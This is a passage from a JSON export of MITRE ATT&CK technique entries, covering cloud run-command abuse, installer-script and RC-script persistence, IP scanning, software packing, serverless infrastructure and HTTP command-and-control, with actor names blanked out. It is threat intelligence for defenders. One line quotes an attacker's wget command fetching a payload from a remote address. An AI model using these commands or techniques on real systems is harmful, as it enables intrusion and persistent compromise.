  "attack-pattern--d94b3ae9-8059-4989-8e9f-ea0f601f80a7": {
    "name": "Cloud Administration Command",
    "example_uses": [
      "has used Azure Run Command and Azure Admin-on-Behalf-of (AOBO) to execute code on virtual machines.",
      "can execute commands on Azure virtual machines using the VM agent.",
      "can run commands on EC2 instances using AWS Systems Manager Run Command."
    ],
    "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. (Citation: AWS Systems Manager Run Command)(Citation: Microsoft Run Command)If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environments virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship](https://attack.mitre.org/techniques/T1199) to execute commands in connected virtual machines.(Citation: MSTIC Nobelium Oct 2021)",
    "similar_words": [
      "Cloud Administration Command"
    ],
    "id": "T1651"
  },
  "attack-pattern--da051493-ae9c-4b1b-9760-c009c46c9b56": {
    "name": "Installer Packages",
    "example_uses": [
      "During 's installation process it uses `postinstall` scripts to extract a hidden plist from the application's `/Resources` folder and execute the `plist` file as a  with elevated permissions."
    ],
    "description": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.(Citation: Installer Package Scripting Rich Trouton)Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.For Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.(Citation: Microsoft Installation Procedures)",
    "similar_words": [
      "Installer Packages"
    ],
    "id": "T1546.016"
  },
  "attack-pattern--db8f5003-3b20-48f0-9b76-123e44208120": {
    "name": "Scanning IP Blocks",
    "example_uses": [
      "has scanned specific lists of target IP addresses.",
      "has targeted IP ranges for vulnerability scanning related to government and critical infrastructure organizations."
    ],
    "description": "Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.Adversaries may scan IP blocks in order to [Gather Victim Network Information](https://attack.mitre.org/techniques/T1590), such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.(Citation: Botnet Scan) Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
    "similar_words": [
      "Scanning IP Blocks"
    ],
    "id": "T1595.001"
  },
  "attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211": {
    "name": "RC Scripts",
    "example_uses": [
      "installs reboot persistence by adding itself to /etc/rc.local.",
      "has installed a run command on a compromised system to enable malware execution on system startup.",
      "can add init.d and rc.d files in the /etc folder to establish persistence.",
      "has the ability to execute on device startup using a modified RC script named S51armled.",
      "adds an entry to the rc.common file for persistence.",
      "used a modified `/etc/rc.local` file on compromised F5 BIG-IP devices to maintain persistence."
    ],
    "description": "Adversaries may establish persistence by modifying RC scripts, which are executed during a Unix-like systems startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.Adversaries may establish persistence by adding a malicious binary path or shell commands to rc.local, rc.common, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.Adversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as ESXi hypervisors, IoT, or embedded systems.(Citation: intezer-kaiji-malware) As ESXi servers store most system files in memory and therefore discard changes on shutdown, leveraging `/etc/rc.local.d/local.sh` is one of the few mechanisms for enabling persistence across reboots.(Citation: Juniper Networks ESXi Backdoor 2022)Several Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004).(Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)",
    "similar_words": [
      "RC Scripts"
    ],
    "id": "T1037.004"
  },
  "attack-pattern--deb98323-e13f-4b0c-8d94-175379069062": {
    "name": "Software Packing",
    "example_uses": [
      "has been packed for obfuscation.",
      "has used several packing methods for obfuscation.",
      "has a packed payload when delivered.",
      "is initially packed.",
      "client component is packed with UPX.",
      "During   used VMProtect to slow the reverse engineering of malicious binaries.",
      "used a custom packer for its  payload which was compressed using the LZMA algorithm.",
      "has obfuscated their payloads through packing.",
      "uses a custom packer.",
      "has been packed with Enigma Protector to obfuscate its contents.",
      "has used a .NET packer to obfuscate malicious files.",
      "has used .NET packer tools to evade detection.",
      "has been packed with NSIS.",
      "has used UPX packers for its payload DLL.",
      "A version of  uses the MPRESS packer.",
      "uses packers such as Themida to obfuscate malicious files.",
      "is packed with an UPX executable packer.",
      "has used UPX to pack .",
      "has been packed for obfuscation.",
      "During  threat actors used software packing in its tools.",
      "For  the threat actors used a variety of packers including CyaX to obfuscate malicious executables.",
      "uses a software packer called Pe123\\RPolyCryptor.",
      "has used the Themida packer to obfuscate malicious payloads.",
      "samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer.",
      "has used malware plugins packed with Themida.",
      "A  variant uses a custom packer.",
      "has packed tools with UPX and has repacked a modified version of  to thwart anti-virus detection.",
      "Versions of  have been packed.",
      "has packed ELF files into other binaries.",
      "payloads are custom-packed archived and encrypted to prevent analysis.",
      "has used UPX to obscure malicious code.",
      "For  the threat actors used UPX to pack some payloads.",
      "leverages a custom packer to obfuscate its functionality.",
      "has used UPX packed binaries.",
      "packed some payloads using different types of packers both known and custom.",
      "can generate packed code modules.",
      "has used UPX and Ezuri packer to pack its binaries.",
      "has used several code packing methods such as Themida Enigma VMProtect and Obsidium to pack their implants.",
      "has used a packed installer file.",
      "has been packed with UPX.",
      "can implement a custom-built virtual machine mechanism to obfuscate its code.",
      "has been packed to help avoid detection.",
      "has been regularly repacked by its operators to create large binaries and evade detection.",
      "has been packed using a dark market crypter.",
      "has been packed with Iz4 compression.",
      "has used the open source UPX executable packer.",
      "has been packed with the UPX packer.",
      "miner has created UPX-packed files in the Windows Start Menu Folder.",
      "has a variant that is packed with UPX.",
      "has packed malware to help avoid detection.",
      "A  payload was packed with UPX.",
      "payloads have been packed.",
      "Delphi variant was packed with UPX.",
      "has been packed with the UPX packer.",
      "The first stage of  is delivered as a packed file.",
      "has the ability to pack its payload.",
      "Some  samples have been packed with UPX.",
      "has been packed with multiple layers of encryption.",
      "uses a custom packing algorithm.",
      "During the   used UPX to pack a copy of .",
      "has used packed DLL payloads.",
      "dropper can be packed with UPX.",
      "has packed malware with UPX.",
      "loader has been packed with the compressed  core DLL and the legitimate DLL for it to hijack.",
      "has used multi-stage packers for exploit code.",
      "has used the MPRESS packer and similar tools for obfuscation.",
      "During   packed malicious .db files with Themida to evade detection.",
      "Some  DLL files have been packed with UPX.",
      "has been packed with a custom packer to hide payloads.",
      "has the option to compress its payload using UPX or MPRESS.",
      "is packed for obfuscation.",
      "has been delivered with encrypted resources and must be unpacked for execution.",
      "has been packed with VMProtect and Themida.",
      "has used VMProtect to pack and protect files.",
      "has packed malware and tools including using VMProtect.",
      "packs a plugin with UPX.",
      "has used custom packers to protect its payloads.",
      "uses the SmartAssembly obfuscator to pack an embedded .Net Framework assembly used for C2.",
      "has been packed with UPX.",
      "has been packed with VMProtect.",
      "has been packed with Themida.",
      "was typically packed using UPX.",
      "has used ConfuserEx to pack its .NET module.",
      "can encrypt and pack malicious payloads.",
      "has packed and encrypted its loader module.",
      "has been known to pack their tools.",
      "has come with a packed payload.",
      "has packed malware payloads before delivery to victims.",
      "has a variant with a packed payload.",
      "used UPX to pack files.",
      "contains multiple payloads that are packed for defense evasion purposes and unpacked on runtime.",
      "has used the Ultimate Packer for Executables (UPX) to obfuscate the FRP client files BrightmetricAgent.exe and SMSvcService.ex) and the port scanning utility ScanLine.",
      "The  payload has been packed for obfuscation.",
      "clones .NET assemblies from other .NET binaries as well as cloning code signing certificates from other software to obfuscate the initial loader payload.",
      "has been delivered as a VMProtect-packed binary.",
      "can use code packing to hinder analysis.",
      "variants have used packers to obfuscate payloads and make analysis more difficult.",
      "has used VMProtect to pack and obscure itself.",
      "uses various packers including CyaX to obfuscate malicious executables."
    ],
    "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018) Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing)  ",
    "similar_words": [
      "Software Packing"
    ],
    "id": "T1027.002"
  },
  "attack-pattern--df1bc34d-1634-4c93-b89e-8120994fce77": {
    "name": "Serverless",
    "example_uses": [],
    "description": "Adversaries may compromise serverless cloud infrastructure, such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them. Once compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps Script Abuse 2021) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",
    "similar_words": [
      "Serverless"
    ],
    "id": "T1584.007"
  },
  "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161": {
    "name": "Web Protocols",
    "example_uses": [
      "can communicate using HTTP over IPv4 or IPv6 depending on a flag set.",
      "has used HTTP for C2 including sending error codes in Cookie headers.",
      "can use HTTP communications for C2 as well as using the WinHTTP library to make requests to the Exchange Web Services API.",
      "can check HTTP request headers for a specific backdoor key and if found will output the result of the command in the variable `HTTP_X_CMD.`",
      "creates a backdoor by making a connection using a HTTP POST.",
      "can use the WebSocket protocol and has initiated communication with C2 servers with an HTTP Upgrade request.",
      "communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.",
      "can use HTTPS for C2 using the Microsoft Graph API.",
      "uses HTTP and HTTPS for C2 communications.",
      "can use HTTP for C2 communication.",
      "uses HTTP for C2 communications.",
      "had to receive an HTTP GET request containing a specific set of parameters in order to execute.",
      "can use HTTP for C2 communications.",
      "has communicated with the C2 server by sending POST requests over HTTP.",
      "has used HTTP for C2.",
      "has the ability to communicate over HTTP and WebSocket Protocol (WSS) for C2.",
      "uses HTTPS and HTTP for C2 communications.",
      "has used HTTP for C2.",
      "has communicated with C2 over HTTP.",
      "establishes a backdoor over HTTP.",
      "has used HTTP POST requests for C2.",
      "uses HTTP for command and control communication.",
      "uses HTTP for command and control.",
      "command and control occurs via HTTPS over port 443.",
      "can use HTTPS in C2 communications.",
      "can use HTTP for C2 communications.",
      "has used HTTP for C2.",
      "can communicate over HTTP for C2.",
      "has used HTTP for C2.",
      "can use protocols like HTTP/HTTPS for command and control traffic.",
      "has used HTTP requests for command and control.",
      "has used HTTPS over port 443 for command and control.",
      "uses HTTPS for C2.",
      "uses HTTP over SSL to communicate commands with the control server.",
      "has conducted C2 communications with a Dropbox account using the HTTP API.",
      "has used HTTP for C2 communication.",
      "has used HTTP for C2.",
      "can use HTTP and HTTPS in communications with remote hosts.",
      "uses HTTPS to conceal C2 communications.",
      "The  malware communicates to its command server using HTTP with an encrypted payload.",
      "communicates with its C2 server over HTTP.",
      "has used HTTP for communications with command and control (C2) servers.",
      "uses HTTP for C2 communications.",
      "main method of communicating with its C2 servers is using HTTP or HTTPS.",
      "version of  communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string &&&.",
      "has used HTTP and HTTPS for C2 communications.",
      "has executed C2 commands directly via HTTP.",
      "server component executes code sent via HTTP POST commands.",
      "can be controlled via a custom C2 protocol over HTTP.",
      "communicates with its C2 server over HTTPS.",
      "uses HTTP for command and control.",
      "uses HTTP for command and control.",
      "has used both HTTP and HTTPS for C2.",
      "can multiple protocols including HTTP and HTTPS in communication with command and control (C2) servers.",
      "can communicate using HTTP or HTTPS.",
      "uses HTTP for command and control.",
      "can send commands to C2 in the body of HTTP POST requests.",
      "has used HTTP for C2.",
      "can use HTTP to communicate with C2.",
      "has used HTTP GET and POST requests for C2.",
      "has used HTTP in outbound communications.",
      "The  malware platform supports many standard protocols including HTTP and HTTPS.",
      "uploads files via unencrypted HTTP.",
      "can use HTTP to establish C2 communications.",
      "has used HTTP for C2.",
      "can retrieve C2 commands from values stored in the `DSID` cookie from the current HTTP request or from decompressed zlib data within the request's `POST` data.",
      "can use HTTP in C2 communications.",
      "has used HTTP in communication with the C2.",
      "has used HTTP GET and POST requests for C2.",
      "has used HTTP for C2 connections.",
      "can use HTTP to communicate with C2 servers.",
      "can use HTTP for C2.",
      "can use HTTP GET requests in C2 communications.",
      "has used HTTP POST for C2.",
      "uses HTTP for C2.",
      "uses HTTP for C2 communications.",
      "uses HTTPS for command and control.",
      "A  variant can communicate with its C2 servers by using HTTPS.",
      "has used HTTPS for C2 communications.",
      "uses HTTP for communication with its C2.",
      "Various implementations of  communicate with C2 over HTTP.",
      "transfers files from the compromised host via HTTP or HTTPS to a C2 server.",
      "can use HTTPS in C2 communications.",
      "uses HTTP for C2.",
      "has used HTTP for C2 communications.",
      "has used HTTP/HTTPS for C2 traffic.",
      "supports HTTP-based C2 profiles.",
      "uses HTTP for C2.",
      "has used HTTP in communications with C2.",
      "One variant of  uses HTTP and HTTPS for C2.",
      "uses HTTP for C2.",
      "can use HTTPS to download files.",
      "has used POST requests and HTTPS for C2 communications.",
      "has sent data to its C2 server via POST requests.",
      "has the ability to make GET requests to download files from C2.",
      "uses HTTPS for C2 communications.",
      "uses HTTP for command and control.",
      "The Uploader variant of  visits a hard-coded server over HTTP/S to download the images  uses to receive commands.",
      "During  threat actors XServer tool communicated using HTTP and HTTPS.",
      "has used HTTP to communicate with a single hard-coded C2 server.",
      "uses HTTP for C2.",
      "has used HTTP for C2.",
      "has used HTTP POST requests to send data to C2.",
      "can use a custom HTTP-based protocol for large data communications that can blend with normal network traffic by riding on top of standard HTTP.",
      "uses HTTP for C2.",
      "has used HTTP POST requests for C2.",
      "can issue commands via HTTP POST.",
      "uses HTTP and HTTPS for C2 communications.",
      "has used HTTP in C2 communications.",
      "can use HTTP for C2.",
      "variants have communicated with C2 servers over HTTP and HTTPS.",
      "used HTTP for C2 communications.  also used an HTTP malware variant to communicate over HTTP for C2.",
      "used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits.",
      "can use HTTP in C2 communications.",
      "has communicated with its C2 via HTTP POST requests.",
      "uses HTTP for C2.",
      "has used HTTPS for C2 communications.",
      "uses HTTP for C2 communications.",
      "has used HTTP for command and control.",
      "can use HTTP for C2.",
      "has the ability to use HTTP in communications with C2.",
      "uses HTTP and HTTPS to communicate with the C2 server.",
      "can use HTTP and HTTPS over port 443 to communicate with actor-controlled C2 servers.",
      "has used HTTP for C2 communications.",
      "used a backdoor QUICKRIDE to communicate to the C2 server over HTTP and HTTPS.",
      "uses HTTP as a transport to communicate with its command server.",
      "uses HTTP/HTTPS for command and control communication.",
      "has the ability to use HTTP in communications with C2.",
      "uses HTTPS for C2.",
      "malware has used HTTP for C2.",
      "can communicate with its C2 servers via HTTP.",
      "has the ability to use HTTP for C2 communications.",
      "has the ability to use HTTP in communication with C2.",
      "has the ability to communicate with C2 servers over HTTP GET/POST requests.",
      "has the ability to use HTTP and HTTPS in communication with C2 servers.",
      "has used HTTP for C2 communications.",
      "can use a HTTP GET request to download its final payload.",
      "has used HTTP in C2 communications.",
      "communicates with its C2 servers over HTTP.",
      "will attempt to detect if the infected host is configured to a proxy. If so  will send beacons via an HTTP POST request.  will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.",
      "can make an HTTPS connection to download additional files.",
      "has used HTTP for C2 communications.",
      "can use GET requests to download additional payloads from C2.",
      "has used HTTP GET and POST requests for C2.",
      "has the ability to contact actor-controlled C2 servers via HTTP.",
      "During  the threat actors used HTTP GET requests for C2.",
      "has conducted C2 over HTTP and HTTPS.",
      "has the ability to use HTTP in communication with C2.",
      "can use HTTP to communicate with its C2 servers.",
      "uses  to communicate with the C2 server over HTTP.",
      "can be configured to use HTTP for command and control.",
      "can also use use HTTP POST and GET requests to send and receive C2 information.",
      "uses HTTP for C2 communications.",
      "uses HTTP for C2.",
      "has used HTTP and HTTPs for C2 communications.",
      "has communicated with its C2 servers via HTTPS and HTTP POST requests.",
      "can use HTTP and HTTPS in C2 communications.",
      "can communicate over HTTP.",
      "can use HTTP to download previously staged shellcode payloads.",
      "uses POST and GET requests over HTTP to communicate with its main C&C server.",
      "used HTTP and HTTPS to send data back to its C2 server.",
      "can use HTTPS for communication with C2.",
      "uses HTTP or HTTPS for C2.",
      "has used HTTP and HTTPS in C2 communications.",
      "During   ran `wget http://103.224.80[.]44:8080/kernel` to download malicious payloads.",
      "can use HTTPS in communication with C2 web servers.",
      "uses HTTP for command and control.",
      "has used HTTP for C2 communications.",
      "can use HTTP for C2.",
      "malware communicates with its C2 server via HTTPS.",
      "s C2 proxy tool sends data to a C2 server over HTTP.",
      "uses HTTP for C2.",
      "has used JavaScript that communicates over HTTP or HTTPS to attacker controlled domains to download additional frameworks. The group has also used downloaded encrypted payloads over HTTP.",
      "has used HTTP POST requests for C2 communications.",
      "Some  variants use HTTP for C2.",
      "can use HTTP in C2 communication.",
      "has used HTTP and HTTPS for command and control.",
      "During  threat actors used HTTP for C2.",
      "will initially beacon out to the NKN network via an HTTP POST over TCP 30003.",
      "can use HTTP in C2 communications.",
      "uses HTTP for C2 communication.",
      "has used HTTP HTTPS and WebDav in network communications.",
      "uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.",
      "has used HTTP for network communication.",
      "communicated over HTTP and HTTPS with C2 servers.",
      "uses HTTPS for C2 communications.",
      "uses HTTP to communicate with a command and control server.",
      "has used HTTP and HTTPS for C2 communications.",
      "uses HTTP for C2.",
      "can communicate over HTTP for C2.",
      "can communicate with its C2 using HTTP.",
      "has used HTTP requests to chain multiple web shells and to contact actor-controlled C2 servers prior to exfiltrating stolen data.",
      "has the ability to process HTTP GET requests as a normal web server and to insert logic that will read or write files or execute commands in response to HTTP POST requests.",
      "uses HTTP for Command & Control.",
      "uses HTTP for C2 communications.",
      "Later implants used by  such as  use a blend of HTTP HTTPS and other legitimate channels for C2 depending on module configuration.",
      "During  the threat actors used HTTP for some of their C2 communications.",
      "can use HTTP and HTTPS for C2 communications.",
      "has used HTTP for C2 communications.",
      "has used HTTP GET and POST requests over port 443 for C2.",
      "has the ability to communicate with its C2 over HTTP.",
      "has used HTTP for C2.",
      "has the ability to support C2 communications over HTTP/S.",
      "uses HTTP for C2.",
      "has used the Ryeol HTTP Client to facilitate HTTP internet communication.",
      "has used HTTP requests for C2.",
      "Variants of  can communicate with C2 over HTTP.",
      "can use HTTP to communicate with C2.",
      "has used HTTP for network communications.",
      "uses HTTPS for command and control.",
      "has used HTTPS for C2.",
      "can conduct command and control over protocols like HTTP and HTTPS.",
      "connects to port 80 of a C2 server using Wininet API. Data is exchanged via HTTP POSTs.",
      "has used HTTP for C2.",
      "network traffic can communicate over HTTP.",
      "has communicated with C2 over HTTPS.",
      "has communicated to hard-coded IP addresses via HTTP.",
      "can use HTTP for C2 communications.",
      "can use HTTP and HTTPS for C2 communications.",
      "uses HTTP for C2.",
      "can communicate with its C2 server using HTTP requests.",
      "uses HTTP and HTTPS for C2.",
      "has used HTTP for C2 communications.",
      "uses HTTP and HTTPS for C2 network communications.",
      "has used HTTPS for command and control.",
      "can send data to C2 with HTTP POST requests.",
      "has has used HTTP GET requests in C2 communications.",
      "can use a custom command and control protocol that can be encapsulated in HTTP or HTTPS. All protocols use their standard assigned ports.",
      "has sent HTTP GET and POST requests to C2 servers to send information and receive instructions.",
      "uses HTTP for command and control.",
      "has used HTTP for C2.",
      "has used HTTP for C2 communications.",
      "has sent collected information to the C2 via HTTP POST request.",
      "can send HTTP GET requests to malicious servers.",
      "s main backdoor connected to a remote C2 server using HTTPS.",
      "can use HTTP or HTTPS for command and control to hard-coded C2 servers.",
      "can use HTTP in C2 communications.",
      "has used HTTP for communication.",
      "uses an HTTP GET request to initialize a follow-on TLS tunnel for command and control.",
      "uses HTTP and HTTPS to communicate with the C2 server.  can also act as a webserver and listen for inbound HTTP requests through an exposed API.",
      "has used tools that communicate with C2 over HTTP.",
      "enables remote interaction and can obtain additional code over HTTPS GET and POST requests.",
      "has used HTTP and HTTPS for command and control.",
      "has initiated connections to external domains using HTTPS.",
      "During the   used  to communicate between compromised hosts and their command-and-control servers via HTTP post requests.",
      "has used HTTPS for C2.",
      "uses HTTP for C2 communications.",
      "has used HTTPS and HTTP GET requests with custom HTTP cookies for C2.",
      "uses HTTP and HTTPS for C2.",
      "can use HTTP for C2 communications.",
      "has used HTTP GET and POST requests for C2 communications.",
      "uses HTTP and HTTPS for command and control.",
      "can use HTTP to retrieve additional binaries.",
      "has used HTTP for C2 communications.",
      "has the ability to use HTTP for its C2.",
      "During  the threat actors enabled HTTP and HTTPS listeners.",
      "During   uses HTTP and HTTPS to contact actor-controlled C2 servers.",
      "can use HTTP or HTTPS for C2 communications.",
      "has used HTTPS in communications with C2.",
      "has used HTTP and HTTPS in communication with C2.",
      "communicates over HTTP or HTTPS for C2.",
      "has the ability to use HTTP in C2 communications.",
      "can use HTTP/S for C2 using the Microsoft Graph API.",
      "has used HTTP for command and control.",
      "has used HTTP for C2 communications.",
      "can use HTTPS for C2 communications.",
      "has communicated with its C2 servers via HTTPS protocol.",
      "has attempted to obtain a VBS script from command and control (C2) nodes over HTTP.",
      "can use HTTP GET to request and pull information from C2.",
      "has the ability to use HTTP in C2 communications.",
      "has the ability to communicate with C2 over HTTP.",
      "uses HTTP for communication to the control servers.",
      "can use HTTP and HTTPS over ports 80 and 443 in C2 communications.",
      "has the ability to use HTTPS for C2 communiations.",
      "can communicate to its C2 over HTTP and HTTPS if directed.",
      "has connected to C2 servers via HTTP.",
      "has the ability to communicate over HTTP.",
      "has used  a RAT that uses HTTP to communicate.",
      "has used HTTP for C2 communications.",
      "has used HTTP and HTTPS for C2 communications.",
      "communicates over HTTP to retrieve a string that is decoded into a C2 server URL.",
      "uses HTTP for C2.",
      "During  the threat actors used HTTP for C2 communications.",
      "can initiate communication over HTTP/HTTPS for its C2 server.",
      "can use HTTP for C2.",
      "malware including RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2.",
      "The  C2 channel uses HTTP POST requests.",
      "can use HTTP/S in C2 communications.",
      "has used HTTP POST requests to transmit data.",
      "A  variant has used HTTP for C2.",
      "is downloaded using HTTP over port 443.",
      "uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.",
      "has used HTTP for C2 communications.",
      "uses HTTP for C2.",
      "has the ability to communicate over HTTP.",
      "can use HTTP for C2 communications.",
      "communicates to its C2 server over HTTP.",
      "uses HTTP for C2 communications.",
      "is capable of using HTTP and HTTPS for C2.",
      "has used HTTP in communications with C2.",
      "uses HTTP and HTTPS for command and control.",
      "malware has used HTTP for C2.",
      "has the ability to use HTTP to send information collected from an infected host to C2.",
      "has the ability to use encapsulated HTTP/S in C2 communications.",
      "has used open-source C2 frameworks including Covenant.",
      "can respond to specific HTTP `POST` requests to `/api/v1/cav/client/visits`.",
      "can parse web requests made to a targeted server to determine the next stage of execution.",
      "can use a .NET HTTPListener class to receive and handle HTTP POST requests.",
      "has used HTTP for C2 communications.",
      "can contact actor-controlled C2 servers by using the Telegram API over HTTPS.",
      "uses HTTP for C2 communications.",
      "communicated over HTTP with preconfigured C2 servers.",
      "has the ability to use HTTP in C2 communications.",
      "has used HTTP for C2.",
      "can use HTTP for C2 communications.",
      "can download files via HTTP and HTTPS.",
      "has used HTTP for C2 communications.",
      "can use HTTPS in C2 communications.",
      "has the `curl` command to send credentials over HTTP and the `curl` and `wget` commands to download new software.  has also used a custom user agent HTTP header in shell scripts.",
      "has executed wget and curl commands to Pastebin over the HTTPS protocol.",
      "uses HTTPS to communicate with its C2 servers to get malware updates modules that perform most of the malware logic and various configuration files.",
      "can communicate with C2 via HTTP POST requests.",
      "can use HTTP to download shellcode from compromised websites.",
      "communicated via HTTP GET or HTTP POST requests to third party servers for C2.",
      "has the ability to use HTTP for C2 communications.",
      "has used HTTP for C2.",
      "can use HTTP and HTTPS in C2 communications.",
      "uses HTTP for communication with the C2 server.",
      "has used HTTP POST requests to communicate with its C2 server to receive commands.",
      "can use HTTP and HTTPS for command and control communication.",
      "communicates with its C2 server over HTTP.",
      "BCS-server tool connects to the designated C2 server via HTTP.",
      "has used HTTP to communicate with C2 nodes.",
      "communicates over HTTP for C2.",
      "uses HTTP requests for C2.",
      "communicated with its C2 server via HTTP GET requests.",
      "During the   used HTTP for C2 and data exfiltration.",
      "can use HTTPS and HTTPS for C2 communication.",
      "has used HTTP and HTTPS for C2.",
      "used curl to connect to adversary-controlled infrastructure and retrieve additional payloads.",
      "uses HTTP and HTTPS protocols for exfiltration and command and control activity.",
      "can send `HTTP GET` requests to C2.",
      "uses HTTP and particularly HTTP POST requests for command and control actions.",
      "uses outbound HTTP requests containing victim information for retrieving second stage payloads. Variants of  can download archive files (such as 7-Zip files) via the victim web browser for second stage execution.",
      "has used HTTP HTTPS and Webdav protocls for C2 communications.",
      "can send registration information to C2 via HTTP `POST`.",
      "can use `POST` to send victim identification to C2 and `GET` to retrieve commands.",
      "can use the curl API for C2 communications.",
      "can establish command and control via HTTP.",
      "connects to command and control servers via HTTP POST requests based on parameters hard-coded into the malware.",
      "established HTTPS communications from adversary-controlled SOHO devices over port 443 with compromised Versa Director servers.",
      "has used HTTP for command and control communication.",
      "used HTTPS for command and control.",
      "has the ability to use HTTP and HTTPS to enable the forwarding of requests for internal services via domain name.",
      "used HTTP POST messages for command and control from  installations during .",
      "network activity is associated with SSL traffic via TCP 443 and proxied HTTP traffic over non-standard ports.",
      "communicates externally via HTTP POST with encrypted content.",
      "communicates via HTTPS at times using a hard-coded User Agent of `Mozilla/5.0 (compatible; MSIE 7.0; Win32)`.",
      "has used HTTP to communicate with the C2 server.",
      "uses HTTP to communicate to command and control infrastructure.",
      "can use HTTP to send victim host information to C2.",
      "During  threat actors used `wget` via HTTP to retrieve payloads.",
      "can use customized HTTP headers.",
      "communicates over TCP 443 via HTTPS to a remote session server under which RDP traffic is transferred.",
      "C2 communication is performed over WebSockets using the open source library SocketRocket with functionality such as heartbeat receiving commands and updating command status.",
      "collected victim device information then transmitted this via HTTP POST to command and control infrastructure.",
      "utilizes HTTP for command and control.",
      "connects to the command and control server via a TCP socket using HTTP.",
      "uses HTTP POST communication for command and control.",
      "During   used a VBS script to send POST requests to register installed malware with C2.",
      "During   network activity included SSL traffic over TCP 443 and HTTP traffic over non-standard ports.",
      "During   used HTTP to communicate between installed backdoors and compromised servers including via the Microsoft Exchange Web Services API.",
      "can use HTTP to tunnel connections in and out of targeted networks.",
      "can use the Exchange Web Services API for C2 communication.",
      "utilizes an HTTP-based Lua backdoor on victim machines.",
      "periodically communicates to its command and control infrastructure through HTTP POST requests.",
      "has the ability to support C2 communications over HTTP and HTTPS.",
      "uses HTTP POST requests to interact with compromised devices.",
      "can retrieve C2 commands sent in HTTP responses.",
      "uses HTTP and HTTPS for command and control communication.",
      "uses web services for command and control communication.",
      "has used tools such as  with command and control communication taking place over HTTPS.",
      "can send HTTP `GET` `POST` `PUT` and `DELETE` requests to the Microsoft Graph API over port 443 for C2 communication.",
      "has used open-source C2 frameworks including .",
      "command and control activity was conducted through HTTP.",
      "has used HTTP and HTTP for command and control communication.",
      "can use HTTP to exfiltrate files to actor-controlled infrastructure.",
      "connected over TCP using HTTP to establish command and control channels.",
      "uses HTTP POST requests to communicate victim information back to the threat actor."
    ],
